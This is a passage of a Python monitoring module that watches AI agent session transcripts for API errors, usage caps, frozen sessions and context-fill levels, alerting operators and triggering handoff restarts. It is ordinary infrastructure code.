    # conflating them is a state I had no way to see at all. atlas measured a
    # healthy main loop whose DISPATCHED SUBAGENTS were being capped: the seat
    # keeps producing turns while the work it dispatched dies. A subagent record
    # carries isSidechain=true, and it must neither EXTEND a main-loop error run
    # (its failure is not the main loop's) nor BREAK one (its success does not
    # prove the main loop can respond). It is a different question about a
    # different executor, so it is skipped here and asked separately.
    if rec.get("isSidechain"):
        return "skip"
    if rec.get("isApiErrorMessage"):
        if _coerce_status(rec.get("apiErrorStatus")) in force_statuses:
            return "force_error"
        return "breaker"
    return "breaker"


def subagent_error_summary(records: list[dict], now_epoch: float, *,
                           recency_seconds: int = API_HEALTH_RECENCY_SECONDS) -> dict:
    """Are DISPATCHED SUBAGENTS erroring, independently of the main loop? (T-2298)

    Returns {"errors": n, "newest_age_s": float|None, "recent": bool}.

    This is the fourth of the states a single snapshot conflates, and the one
    with no outside signal at all before now: the seat keeps producing turns —
    so every main-loop metric reads healthy — while the work it dispatched is
    being capped and dying. atlas found it from inside; nothing outside could see it.

    Deliberately NOT folded into detect_sustained_api_errors. That function
    decides whether to force-RESTART a session, and a restart does not fix a
    capped subagent — it would destroy a healthy main loop to treat a problem
    somewhere else. Two questions, two answers, two remedies.
    """
    errs = [r for r in records
            if isinstance(r, dict) and r.get("type") == "assistant"
            and r.get("isSidechain") and r.get("isApiErrorMessage")]
    stamps = [t for t in (_parse_iso8601_to_epoch(r.get("timestamp")) for r in errs)
              if t is not None]
    newest_age = (now_epoch - max(stamps)) if stamps else None
    return {"errors": len(errs),
            "newest_age_s": newest_age,
            "recent": newest_age is not None and newest_age <= recency_seconds}


def detect_sustained_api_errors(
    records: list[dict],
    now_epoch: float,
    *,
    min_run: int = API_HEALTH_MIN_ERROR_RUN,
    min_span_seconds: int = API_HEALTH_MIN_RUN_SPAN_SECONDS,
    recency_seconds: int = API_HEALTH_RECENCY_SECONDS,
    force_statuses=API_HEALTH_FORCE_STATUSES,
) -> bool:
    """Return True iff the jsonl tail shows a sustained, current run of force-worthy API errors.

    `records` must be most-recent-first (as read_recent_records returns). The
    leading run is the maximal prefix of consecutive force-worthy error records,
    skipping over user/system/metadata records, and stopping at the first
    'breaker' (a successful assistant response or a non-force-status error).

    Fires only when ALL hold:
      - the run has >= min_run force-worthy errors (each with a parseable timestamp),
      - the run spans >= min_span_seconds (newest - oldest; guards vs a fast burst),
      - the run's newest error is within recency_seconds of now_epoch (guards vs a
        stale run from a session that has since gone quiet / recovered).

    Deliberately false-negative-biased: a single successful response resets the
    run. The cost of a false-positive force-restart is real — it skips the
    handoff, losing unsaved context — whereas a genuinely-poisoned 400ing
    session has no recoverable context anyway, and a missed detection is simply
    re-evaluated on the next poll.
    """
    run_ts: list[float] = []
    for rec in records:
        cls = _classify_api_record(rec, force_statuses)
        if cls == "skip":
            continue
        if cls == "force_error":
            ts = _parse_iso8601_to_epoch(rec.get("timestamp"))
            if ts is None:
                # Can't place it in time; skip without extending or breaking.
                continue
            run_ts.append(ts)
            continue
        break  # 'breaker' ends the leading run
    if len(run_ts) < min_run:
        return False
    newest = max(run_ts)
    oldest = min(run_ts)
    if (now_epoch - newest) > recency_seconds:
        return False
    if (newest - oldest) < min_span_seconds:
        return False
    return True


def _record_text(rec: dict) -> str:
    """Concatenate the text of a jsonl record's message content (str or block list)."""
    msg = rec.get("message") if isinstance(rec.get("message"), dict) else {}
    content = msg.get("content")
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        return " ".join(
            b.get("text", "") for b in content
            if isinstance(b, dict) and b.get("type") == "text"
        )
    return ""


def detect_capability_cap(
    records: list[dict],
    now_epoch: float,
    *,
    min_run: int = CAPABILITY_CAP_MIN_RUN,
    recency_seconds: int = CAPABILITY_CAP_RECENCY_SECONDS,
) -> str | None:
    """Return the cap error text iff the jsonl tail shows a current capability-cap wedge.

    `records` must be most-recent-first (as read_recent_records returns). Walks the
    leading run of assistant records: a `isApiErrorMessage` record whose CONTENT
    matches the cap signature (spend/usage limit, switch models) extends the run;
    any other assistant record (a successful turn, or an error without the cap
    content) is a BREAKER that ends it. User/system/metadata records are skipped.

    Content-anchored, NOT status-alone: a bare 429 is a transient rate-limit that
    self-resolves, so matching on status would false-fire; the spend/usage-limit
    content is the non-recoverable signal. Requires >= min_run consecutive cap
    errors and the newest within recency_seconds (a recovered session's trailing
    success breaks the run; a stale frozen transcript fails recency). Returns the
    newest matched error text for the alert, else None.
    """
    run = 0
    newest_text: str | None = None
    newest_ts: float | None = None
    for rec in records:
        if not isinstance(rec, dict) or rec.get("type") != "assistant":
            continue  # skip user / system / metadata records
        if rec.get("isApiErrorMessage"):
            txt = _record_text(rec)
            if _CAPABILITY_CAP_CONTENT_RE.search(txt):
                run += 1
                if newest_text is None:
                    newest_text = txt
                    newest_ts = _parse_iso8601_to_epoch(rec.get("timestamp"))
                continue
        break  # first non-cap assistant record breaks the leading run
    if run < min_run:
        return None
    if newest_ts is not None and (now_epoch - newest_ts) > recency_seconds:
        return None
    return newest_text


def detect_consent_fallback(records: list[dict]) -> tuple[str, str] | None:
    """Return (originalModel, fallbackModel) iff the jsonl tail shows a
    model_consent_fallback SYSTEM record for a capped-tier model.

    A DISTINCT cap class from detect_capability_cap's assistant isApiErrorMessage:
    the Fable-5 weekly-CREDITS cap surfaces as a single `type:system,
    subtype:model_consent_fallback` record and the harness AUTO-SWITCHES the live
    session to `fallbackModel` — the session SELF-RECOVERS onto the fallback after
    the consent stall, so this is NOT a wedge. detect_capability_cap is structurally
    blind to it (skips system records; content doesn't match the cap regex). The
    residual risk is durability: the supervisor --model pin still points at the
    capped model, so the next restart re-stalls; the caller nudges a pin-check.

    Note the matched fields (`subtype`, `originalModel`, `fallbackModel`) are TOP-LEVEL
    on the system record, NOT under `message.content` — so this reads them directly,
    not via _record_text (which walks message content and would see nothing here).

    `records` must be most-recent-first (as read_recent_records returns). Returns the
    NEWEST matching (originalModel, fallbackModel) tuple, else None. No min-run (a
    single fallback record IS the signal) and no recency guard (the caller's cooldown
    gates re-fires; read_recent_records' bounded tail naturally stops matching once the
    fallback scrolls out of the window a few cycles after it lands).
    """
    for rec in records:
        if not isinstance(rec, dict) or rec.get("type") != "system":
            continue
        if rec.get("subtype") != _CONSENT_FALLBACK_SUBTYPE:
            continue
        original = rec.get("originalModel")
        if original in _CONSENT_FALLBACK_CAPPED_MODELS:
            return (original, rec.get("fallbackModel") or "")
    return None


def compute_fill_tokens(usage: dict) -> int:
    """Sum the four token-count fields from a usage dict."""
    return (
        int(usage.get("input_tokens", 0))
        + int(usage.get("cache_creation_input_tokens", 0))
        + int(usage.get("cache_read_input_tokens", 0))
        + int(usage.get("output_tokens", 0))
    )


def in_cooldown(last_restart_path: Path, cooldown_seconds: int) -> bool:
    """Return True if last restart was within cooldown_seconds.

    State file shape: {"ts": <epoch>, "fill_pct": <float>, "jsonl_path": <str>, "agent": <str>}.
    Missing/malformed state file → not in cooldown (fail-open).
    """
    if not last_restart_path.exists():
        return False
    try:
        data = json.loads(last_restart_path.read_text(encoding="utf-8"))
        last_ts = int(data.get("ts", 0))
    except (json.JSONDecodeError, OSError, ValueError, TypeError):
        return False
    return (int(time.time()) - last_ts) < cooldown_seconds


def write_last_restart_state(
    path: Path,
    agent: str,
    fill_pct: float,
    jsonl_path: Path,
    reason: str = "context_fill_threshold",
    jsonl_mtime: float | None = None,
) -> None:
    """Record the restart event to the per-agent cooldown state file, then update
    the restart-clustering ring (T-0650).

    This is the single commit point for graceful handoff restarts (context-fill
    threshold + wedge/staleness), so the clustering diagnostic hooks here once.
    The cluster recorder is fail-open and only emits at the trailing-window edge,
    so this stays safe to call on every restart.

    ``jsonl_mtime`` (the fired-against transcript's mtime at fire time) is recorded
    when supplied so the next cycle can tell a frozen dead transcript apart from a
    still-growing one — the T-1328 dead-transcript re-fire guard."""
    data = {
        "ts": int(time.time()),
        "agent": agent,
        "fill_pct": round(fill_pct, 4),
        "jsonl_path": str(jsonl_path),
    }
    if jsonl_mtime is not None:
        data["jsonl_mtime"] = jsonl_mtime
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data) + "\n", encoding="utf-8")
    record_restart_and_maybe_alert_cluster(agent, reason)


def _read_state_file(path: Path) -> dict | None:
    """Load a state JSON file; None on missing/malformed."""
    if not path.exists():
        return None
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
        return data if isinstance(data, dict) else None
    except (json.JSONDecodeError, OSError, ValueError):
        return None


# ---------------------------------------------------------------------------
# Dead-transcript re-fire guard (T-1328)
# ---------------------------------------------------------------------------
#
# find_latest_jsonl() returns the newest-mtime jsonl, but right after a recycle
# the just-killed session's transcript (large, at/above threshold) can still
# out-rank the freshly-spawned IDLE session by mtime. Once the cooldown lifts the
# monitor would re-measure that DEAD transcript >= threshold and fire the SAME
# restart again — killing the healthy fresh session. Incident 2026-06-26: Recovery
# recycled twice ~29 min apart, BOTH against the same frozen jsonl (a630f538,
# mtime frozen at the first recycle's service-stop), the second fire killing a
# ~5%-full healthy session.
#
# Guard: if the selected jsonl is the one we LAST restarted for AND it has not
# grown meaningfully since that fire (current mtime within TOLERANCE of the
# recorded fire-time mtime), it is the frozen dead transcript → suppress. The
# tolerance absorbs the drain gap: the dying session flushes its handoff for up
# to a couple minutes AFTER the tombstone, so a zero-tolerance compare would miss
# it (the incident's final flush landed ~103s past the fire). If the SAME jsonl
# is still GROWING well past the fire (a no-op restart that left the inner session
# alive — the systemctl-no-op failure mode), the guard does NOT suppress: that
# session genuinely needs escalation. Fail-open everywhere (missing state, legacy
# state without jsonl_mtime, unreadable mtime → do not suppress).
DEAD_TRANSCRIPT_MTIME_TOLERANCE_SECONDS = int(
    os.environ.get("CONTEXT_FILL_DEAD_TRANSCRIPT_TOLERANCE_SECONDS", str(5 * 60))
)


def selected_jsonl_is_dead_restarted(
    jsonl: Path, sudo_user: str, agent: str, guard_state_path: Path
) -> bool:
    """True iff `jsonl` is the frozen transcript we last FIRED a restart against (see
    guard docstring above). Reads the last-FIRE state (T-1330: written unconditionally
    at fire time), NOT the success-only last_restart — so it also guards a transcript
    frozen by a restart that issued the service-restart but was recorded 'failed' (e.g.
    a slow-booting fresh session that missed the 60s steady-state window). Fail-open:
    any uncertainty returns False (do not suppress)."""
    state = _read_state_file(guard_state_path)
    if not state:
        return False
    if str(jsonl) != state.get("jsonl_path"):
        return False
    recorded_mtime = state.get("jsonl_mtime")
    if recorded_mtime is None:
        return False  # legacy / first-fire state without mtime → fail-open
    cur_mtime = _jsonl_mtime(jsonl, sudo_user, agent)
    if cur_mtime is None:
        return False  # cannot read mtime → fail-open
    try:
        return float(cur_mtime) <= (
            float(recorded_mtime) + DEAD_TRANSCRIPT_MTIME_TOLERANCE_SECONDS
        )
    except (TypeError, ValueError):
        return False


# ---------------------------------------------------------------------------
# Wedge/staleness ring (T-0857)
# ---------------------------------------------------------------------------
#
# A bounded ring of the last N fill readings per agent, in a SEPARATE state file
# (independent control loop — must not share the cooldown/api-health files).


def _fill_history_path_for_agent(agent: str) -> Path:
    """Per-agent fill-history ring file. Separate from the cooldown + api-health
    state files (different control loop; per the T-0510 separation rationale)."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_fill_history.json"


def read_fill_history(path: Path) -> list[dict]:
    """Load the ring's readings list; [] on missing/malformed (fail-open)."""
    data = _read_state_file(path)
    if not data:
        return []
    readings = data.get("readings")
    return readings if isinstance(readings, list) else []


def append_fill_reading(
    path: Path, agent: str, tokens: int, jsonl_path: Path, keep: int = STALENESS_POLLS
) -> list[dict]:
    """Append {ts, tokens, jsonl} to the ring, truncate to the last `keep`, write.

    Critical false-positive guard: if the session jsonl CHANGED since the last
    reading, RESET the ring first — a new session file means a fresh session
    (restart/rotation), and identical token counts across different sessions are
    not a wedge. Returns the post-write readings list.
    """
    history = read_fill_history(path)
    jsonl_name = Path(jsonl_path).name
    if history and history[-1].get("jsonl") != jsonl_name:
        history = []  # session rotated → fresh ring
    history.append({"ts": int(time.time()), "tokens": int(tokens), "jsonl": jsonl_name})
    history = history[-keep:] if keep > 0 else history
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps({"agent": agent, "readings": history}) + "\n", encoding="utf-8"
    )
    return history


def is_fill_frozen(history: list[dict], polls: int = STALENESS_POLLS) -> bool:
    """True iff the last `polls` readings all share the SAME token count AND the
    SAME jsonl — i.e. the session made zero progress across N consecutive polls.

    Requires at least `polls` readings (warming up → not frozen). The same-jsonl
    requirement guards against a coincidental token match across a rotation."""
    if polls <= 0 or len(history) < polls:
        return False
    window = history[-polls:]
    first_tokens = window[0].get("tokens")
    first_jsonl = window[0].get("jsonl")
    if first_tokens is None or first_jsonl is None:
        return False
    return all(
        r.get("tokens") == first_tokens and r.get("jsonl") == first_jsonl
        for r in window
    )


def recent_fill_velocity_tokens(
    history: list[dict], polls: int = STALENESS_POLLS
) -> int | None:
    """Max single-poll token GROWTH over the most recent `polls` intervals, in
    ABSOLUTE tokens (T-1497 part B — turn sizes don't scale with the window).
    This is the 'how fast is this session filling' signal that idle-vs-active
    keys on (T-1491).

    Returns None when it CANNOT be judged — fewer than `polls` readings (the ring
    is bounded to STALENESS_POLLS entries by append_fill_reading, so `polls`
    samples = the full ring = polls-1 deltas), or a jsonl rotation anywhere in the
    window (a fresh session's counts aren't comparable to the old one's). The caller
    treats None as 'not confirmed idle' and keeps the base threshold. Only positive
    growth counts (a drop from compaction/rotation is not 'velocity'); floored at
    0."""
    if polls <= 0 or len(history) < polls:
        return None
    window = history[-polls:]
    jsonl = window[-1].get("jsonl")
    toks: list[int] = []
    for r in window:
        t = r.get("tokens")
        if r.get("jsonl") != jsonl or not isinstance(t, int):
            return None  # rotation / malformed → not comparable → unknown
        toks.append(t)
    if len(toks) < 2:
        return None  # need at least one delta
    max_delta = max((toks[i + 1] - toks[i]) for i in range(len(toks) - 1))
    return max(0, max_delta)


def effective_fill_threshold(
    base_threshold: float, history: list[dict], window_tokens: int
) -> float:
    """Idle-aware restart threshold (T-1491). Returns the HIGHER idle ceiling only
    when the session is CONFIRMED idle (recent fill velocity below the cut); returns
    the base threshold otherwise — including when velocity is unknown, when the
    feature is disabled (idle<=base), or when the config would violate the safety
    invariant. Never returns below base."""
    idle_thr = CONTEXT_FILL_IDLE_THRESHOLD
    # T-1497 part C (the operator TG 5385): reground the idle ceiling to an ABSOLUTE grace
    # above base (mirror part B). Cap the relative 0.90 so the grace (ceiling − base)
    # never exceeds CONTEXT_FILL_IDLE_GRACE_TOKENS; 0.90 stays the upper bound, so
    # small windows (where base+grace/window ≥ 0.90) are unchanged. Only binds on
    # large windows (1M: base 0.50 + 0.15 = 0.65 ceiling = 650K, vs the old 900K).
    if window_tokens > 0:
        idle_thr = min(idle_thr, base_threshold + CONTEXT_FILL_IDLE_GRACE_TOKENS / window_tokens)
    if idle_thr <= base_threshold:
        return base_threshold  # disabled / misconfigured / grace collapsed to base
    vel_cut = int(
        os.environ.get("CONTEXT_FILL_IDLE_VELOCITY_TOKENS", CONTEXT_FILL_IDLE_VELOCITY_TOKENS)
    )
    # SAFETY: refuse to raise the ceiling unless one poll-interval's max idle-
    # velocity growth is guaranteed to stay under the hard ceiling from idle_thr.
    # Token form (T-1497 part B): headroom above the ceiling is window-relative,
    # the velocity cut is absolute. NOTE the coupling documented at the constant:
    # this refuses (fail-safe: base threshold) for any window ≤ 310K at defaults.
    if (1.0 - idle_thr) * window_tokens <= vel_cut:
        return base_threshold
    vel = recent_fill_velocity_tokens(history)
    if vel is not None and vel < vel_cut:
        return idle_thr
    return base_threshold


# ---------------------------------------------------------------------------
# Restart-clustering diagnostic (T-0650)
# ---------------------------------------------------------------------------
#
# compaction-as-diagnostic (external orchestration framing): hitting a context
# limit means the task was too large. Pantheon doesn't compact — it restarts
# -with-handoff (T-0008) preemptively at the fill threshold. The translated
# signal: a CLUSTER of handoff restarts for one agent in a short window is the
# same scope-overshoot tell. We ring-buffer handoff-restart events and emit ONE
# Telegram alert (routed via Recovery, like the wedge/context-fill restart notices)
# on the EDGE where the trailing-window count first reaches N — so a steady drip
# past the threshold doesn't re-alert every fire, but a fresh burst after the
# window clears does. Sibling to the T-0584 loud-after-N-FAILURES pattern,
# applied to SUCCESSFUL handoff restarts instead.
#
# Scope: counts the graceful handoff restarts that flow through
# write_last_restart_state (context-fill threshold + wedge/staleness). It does
# NOT count api-health force-restarts — those are a distinct upstream-error
# signal with their own consecutive-fire CRITICAL escalation, and folding them
# in would mislabel an outage as a task-scope problem.

RESTART_CLUSTER_N = int(os.environ.get("PANTHEON_RESTART_CLUSTER_N", "3"))
RESTART_CLUSTER_WINDOW_SECONDS = int(
    os.environ.get("PANTHEON_RESTART_CLUSTER_WINDOW_SECONDS", str(4 * 3600))
)
# Keep a little more than N so a rolling window always has events to count over.
RESTART_CLUSTER_KEEP = 12


def _restart_history_path_for_agent(agent: str) -> Path:
    """Per-agent handoff-restart event ring. Separate state file from the cooldown
    / api-health / fill-history files (independent control loop, per the T-0510
    separation rationale)."""
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_restart_history.json"


def read_restart_history(path: Path) -> list[dict]:
    """Load the ring's events list; [] on missing/malformed (fail-open)."""
    data = _read_state_file(path)
    if not data:
        return []
    events = data.get("events")
    return events if isinstance(events, list) else []


def _count_restarts_in_window(events: list[dict], now: int, window_seconds: int) -> int:
    """Count ring events whose ts falls within the trailing `window_seconds`."""
    return sum(
        1
        for e in events
        if isinstance(e.get("ts"), int) and 0 <= now - e["ts"] <= window_seconds
    )


def _fmt_restart_ts(ts: int) -> str:
    """Compact UTC stamp for the alert body."""
    return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%dT%H:%MZ")


def _active_tickets_for(agent: str) -> list[str]:
    """Best-effort ids of active tickets targeting `agent`, for the cluster-alert
    context line. Fail-open to [] — this is alert garnish, never load-bearing."""
    try:
        active_dir = Path(__file__).resolve().parent.parent / "tickets" / "active"
        if not active_dir.is_dir():
            return []
        ids: list[str] = []
        for f in sorted(active_dir.glob("*.md")):
            try:
                head = f.read_text(encoding="utf-8")[:1500]
            except OSError:
                continue
            for line in head.splitlines():
                if line.startswith("target:"):
                    if line.split(":", 1)[1].strip() == agent:
                        ids.append(f.stem)
                    break
        return ids
    except OSError:
        return []


def record_restart_and_maybe_alert_cluster(
    agent: str,
    reason: str,
    *,
    now: int | None = None,
    n: int = RESTART_CLUSTER_N,
    window_seconds: int = RESTART_CLUSTER_WINDOW_SECONDS,
) -> bool:
    """Append a handoff-restart event to the per-agent ring and emit ONE cluster
    alert on the edge where the trailing-window count first reaches `n`.

    Edge-trigger: alert iff (count WITH this event >= n) AND (count WITHOUT it
    < n). A steady drip of restarts past the threshold therefore does not
    re-alert on every fire; a fresh burst after the window clears does.

    Returns True iff an alert was sent. Fail-open throughout: any ring read/write
    error is logged and swallowed so the clustering bookkeeping can NEVER block or
    crash an in-progress restart.
    """
    now = int(time.time()) if now is None else now
    path = _restart_history_path_for_agent(agent)
    try:
        events = read_restart_history(path)
        prior_in_window = _count_restarts_in_window(events, now, window_seconds)
        events.append({"ts": now, "reason": reason})
        events = events[-RESTART_CLUSTER_KEEP:]
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(
            json.dumps({"agent": agent, "events": events}) + "\n", encoding="utf-8"
        )
    except OSError as exc:
        _log(agent, f"restart-cluster: ring write failed ({exc!r}); skipping cluster check")
        return False

    count = prior_in_window + 1
    # Edge-trigger + dedup in one condition: fire only as the count first reaches n.
    if not (count >= n and prior_in_window < n):
        return False

    window_events = [
        e
        for e in events
        if isinstance(e.get("ts"), int) and 0 <= now - e["ts"] <= window_seconds
    ]
    stamps = ", ".join(_fmt_restart_ts(e["ts"]) for e in window_events)
    hours = round(window_seconds / 3600, 1)
    actives = _active_tickets_for(agent)
    actives_str = ", ".join(actives) if actives else "none"
    msg = (
        f"🔁 [restart-cluster] {agent}: {count} handoff restarts within {hours}h "
        f"({stamps}) — compaction-as-diagnostic signal: the session's task scope may "
        f"be too large to fit one context window. Active tickets: {actives_str}. (T-0650)"
    )
    try:
        try:
            from tools.inbox_consumer import _send_alert_via_recovery  # run-as-package / tests
        except ImportError:
            from inbox_consumer import _send_alert_via_recovery  # run-as-script (prod)
        _send_alert_via_recovery(msg, "restart-cluster")
        return True
    except Exception as exc:
        _log(
            agent,
            f"restart-cluster notify: recovery-routing unavailable ({exc!r}); direct-telegram fallback",
        )
        return send_telegram(f"[fallback: recovery-routing unavailable] {msg}")


def _api_health_state_path_for_agent(agent: str) -> Path:
    """Return the per-agent api-health last-fire state file path.

    Distinct from the context-fill state file: api-health and context-fill are
    different control loops with different cooldowns, so they must not suppress
    each other (per the T-0510 review — sharing one cooldown file would lock
    out api-health detection during a context-fill cooldown, defeating the
    whole point during an outage).
    """
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_api_health.json"


def _model_outage_state_path_for_agent(agent: str) -> Path:
    """Per-agent model-outage last-alert state file (drives the alert cooldown).

    A SEPARATE control loop from api-health and context-fill — its own cooldown
    file so a model-outage alert neither suppresses nor is suppressed by the
    restart loops.
    """
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_model_outage.json"


def write_model_outage_state(path: Path, agent: str, jsonl_path: Path) -> None:
    """Stamp the model-outage alert cooldown (in_cooldown reads ``ts``)."""
    data = {
        "ts": int(time.time()),
        "agent": agent,
        "jsonl_path": str(jsonl_path),
        "reason": MODEL_OUTAGE_ALERT_LABEL,
    }
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data) + "\n", encoding="utf-8")


def _auth_outage_state_path_for_agent(agent: str) -> Path:
    """Per-agent auth-outage last-alert state file (drives the alert cooldown).

    A SEPARATE control loop from api-health / model-outage / context-fill — its
    own cooldown file so an auth-outage alert neither suppresses nor is suppressed
    by the other loops.
    """
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_auth_outage.json"


def write_auth_outage_state(path: Path, agent: str, jsonl_path: Path) -> None:
    """Stamp the auth-outage alert cooldown (in_cooldown reads ``ts``)."""
    data = {
        "ts": int(time.time()),
        "agent": agent,
        "jsonl_path": str(jsonl_path),
        "reason": AUTH_OUTAGE_ALERT_LABEL,
    }
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data) + "\n", encoding="utf-8")


def _error_persist_state_path_for_agent(agent: str, error_class: str) -> Path:
    """Per-(agent, error_class) first-seen marker for the persistence gate (T-2607).

    SEPARATE from each detector's cooldown file: this tracks the start of the
    current error STREAK (not the last fire), and each class keeps its own marker
    so an api-health streak and an auth-outage streak never clobber each other.
    Holds a single integer timestamp (the wedge-model shape), not JSON.
    """
    state_dir_env = os.environ.get("PANTHEON_STATE_DIR")
    state_dir = Path(state_dir_env) if state_dir_env else _DEFAULT_STATE_DIR
    return state_dir / f"context_fill_{agent}_{error_class}_error_first_seen_at"


def _check_error_persistent(
    agent: str, error_class: str, detected: bool, *, now: int | None = None
) -> bool:
    """Two-observation persistence gate for the error detectors (T-2607 PART 1).

    Wraps the detect→fire transition of the three error detectors so a fire
    requires the error to PERSIST from one poll into the next, not fire on a
    single-poll blip. Modeled on inbox_consumer._check_pane_wedge_persistent.

    Marker = _error_persist_state_path_for_agent(agent, error_class), holding the
    first-seen timestamp of the current streak:
      - detected is False        -> CLEAR the marker (streak broken), return False.
      - detected, marker absent   -> write ``now``, return False (first sighting;
                                     a single observation can NEVER fire).
      - detected, marker present, ``now - first_seen >= ERROR_PERSIST_SECONDS``
                                  -> return True (fire).
      - detected, marker present, under the floor -> return False (not yet).
    A corrupt marker is treated as a fresh first sighting (rewrite, return False).

    Returns True iff the caller should FIRE. The marker is NOT cleared on a fire
    (mirrors the wedge model): the streak persists until a negative detect clears
    it; the detector's own cooldown handles re-fire spacing. Fail-soft: a state
    read/write error degrades toward NOT firing (it can only defer, never
    spuriously fire), so a broken state dir can never turn into a false restart.
    """
    if now is None:
        now = int(time.time())
    state_path = _error_persist_state_path_for_agent(agent, error_class)

    if not detected:
        try:
            state_path.unlink(missing_ok=True)
        except OSError:
            pass
        return False

    if not state_path.exists():
        try:
            state_path.parent.mkdir(parents=True, exist_ok=True)
            state_path.write_text(str(now), encoding="utf-8")
        except OSError:
            pass
        return False  # first sighting — require a second, persisting observation

    try:
        first_seen = int(state_path.read_text(encoding="utf-8").strip())
    except (OSError, ValueError):
        # Corrupt/unreadable marker — restart the streak clock, do not fire.
        try:
            state_path.write_text(str(now), encoding="utf-8")
        except OSError:
            pass
        return False

    return now - first_seen >= ERROR_PERSIST_SECONDS


def write_api_health_state(
    path: Path, agent: str, jsonl_path: Path, consecutive: int
) -> None:
    """Record an api-health force-restart fire (drives cooldown + consecutive-fire tracking)."""
    data = {
        "ts": int(time.time()),
        "agent": agent,
        "jsonl_path": str(jsonl_path),
        "consecutive": consecutive,
        "reason": API_HEALTH_FORCE_REASON,
    }
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data) + "\n", encoding="utf-8")


def write_tombstone(state_dir: Path, agent: str, reason: str = "context_fill_threshold") -> Path:
    """Write a restart tombstone for an agent that uses tombstone-write mode.

    Per ORG-020 Phase 1: used for Recovery self-restart. The pantheon-restart-drain
    timer running on Recovery's own account will pick up this tombstone on its next
    cycle (~30s) and fire handoff_and_restart.sh.

    Returns the path of the written tombstone file.
    """
    state_dir.mkdir(parents=True, exist_ok=True)
    tombstone_name = TOMBSTONE_FILENAME_PATTERN.format(agent=agent)
    path = state_dir / tombstone_name
    data = {
        "requested_at": int(time.time()),
        "agent": agent,
        "reason": reason,
    }
    path.write_text(json.dumps(data) + "\n", encoding="utf-8")
    return path


def build_restart_argv(cfg: dict, agent: str, skip_ack: bool = False) -> list[str]:
    """Full argv for handoff_and_restart.sh against an agent's tmux (T-1795).

    Single source of truth for both the blocking path (`fire_restart`) and the
    detached path (`fire_restart_detached`). The XDG_RUNTIME_DIR assignment must
    reach the sudo'd bash UNEXPANDED — the whole inner command stays one
    `bash -c` string element and the argv stays a Python list end-to-end.
    """
    restart_bin = cfg.get("restart_bin", HANDOFF_RESTART_BIN)
    # Per-agent lockfile so cross-account fires don't contend on /tmp file
    # ownership (default lock is owned by whichever account first invoked
    # handoff_and_restart.sh; subsequent cross-account runs hit Permission
    # denied on the exec 9>$LOCKFILE step).
    lockfile = cfg.get("restart_lockfile", f"/tmp/handoff_and_restart_{agent}.lock")
    inner = (
        f"XDG_RUNTIME_DIR=/run/user/$(id -u) {restart_bin} "
        f"--service {cfg['restart_service']} "
        f"--mode {cfg['restart_mode']} "
        f"--target-pane {cfg['restart_target_pane']} "
        f"--handoff-file {cfg['handoff_file']} "
        f"--lockfile {lockfile}"
        + (" --skip-ack" if skip_ack else "")
        # T-2658: control-plane seats need the kill-session + scope-liveness
        # branch inside handoff_and_restart.sh instead of plain systemctl
        # restart / is-active against a bespoke unit.
        + (" --supervisor control-plane" if cfg.get("supervisor") == "control-plane" else "")
    )
    return _sudo_prefix(cfg["sudo_user"]) + ["bash", "-c", inner]


# Outer backstop for a detached restart unit. MUST sit ABOVE the script's own
# wall-clock watchdog (HANDOFF_RESTART_WALL_CLOCK_SECS, default 1800s) so the
# script's designed timeouts — ack-timeout exit 4, then the same-UID TERM→KILL
# watchdog — always fire first and the cgroup SIGKILL stays a never-reached
# backstop. A smaller value would reproduce the T-1795 mid-ack kill at a
# different number. 2100 = 1800 + 300 kill-grace. Known overlap: 2100s (35 min)
# exceeds the caller's 30-min remediation cooldown, so a wedged prior unit can
# still be alive at the next fire — the per-agent flock makes the second script
# exit 1 inside ITS unit (dispatch still succeeds) and cross-cycle
# effectiveness detection catches it. Version note: cross-UID cgroup-kill from
# the user manager works on this host (proven 2026-07-17); on older systemd
# stacks the script's same-UID watchdog is the only reliable killer — one more
# reason it must be the primary and this the backstop.
DETACHED_RESTART_RUNTIME_MAX_SECONDS = 2100
# systemd-run returns as soon as the transient unit is registered; 30s covers a
# slow user bus without approaching any caller's unit timeout.
DETACHED_DISPATCH_TIMEOUT_SECONDS = 30

# T-2459: context-fill's own detached-restart unit prefix, distinct from
# channel-liveness's ("pantheon-channel-remediate"), so cross-cycle result reads
# and journalctl forensics never collide between the two monitors' remediations.
CTXFILL_REMEDIATE_UNIT_PREFIX = "pantheon-ctxfill-remediate"


def fire_restart_detached(
    cfg: dict, agent: str, *, unit_prefix: str = "pantheon-channel-remediate",
    skip_ack: bool = False, collect: bool = True,
) -> tuple[bool, str, str]:
    """Dispatch handoff_and_restart.sh as a DETACHED transient user unit (T-1795).

    Short-budget oneshot monitor units cannot host the restart's legitimate
    multi-minute block (600s handoff-ack + restart + steady-wait): systemd
    SIGKILLs the whole unit cgroup at TimeoutStartSec, killing an in-flight
    remediation AFTER its handoff prompt was delivered (2026-07-17 incident —
    the prompt is left queued on the target with no owner to restart the
    service). `systemd-run --user` registers a SIBLING unit under the user
    manager, outside the caller's cgroup, so the restart owns its full
    lifecycle bounded only by RuntimeMaxSec.

    A True return means DISPATCHED, not restarted — the script's success is
    judged cross-cycle by the caller (consecutive-tracking + escalation).
